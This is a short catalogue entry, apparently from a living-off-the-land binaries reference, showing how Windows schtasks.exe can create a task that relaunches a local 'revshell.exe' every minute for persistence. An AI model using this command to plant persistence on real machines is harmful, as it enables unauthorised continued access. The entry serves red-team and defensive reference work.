## schtasks.exe

* Functions: Execute, Persistence

```
schtasks /create /sc minute /mo 1 /tn "Reverse shell" /tr c:\some\directory\revshell.exe
```

Acknowledgements:
* 

Code sample:
* 

Resources:
* https://isc.sans.edu/forums/diary/Adding+Persistence+Via+Scheduled+Tasks/23633/

Full path:
```
c:\windows\system32\schtasks.exe
```

Notes:
Create a recurring task to provide persistence, eg. to start a reverse shell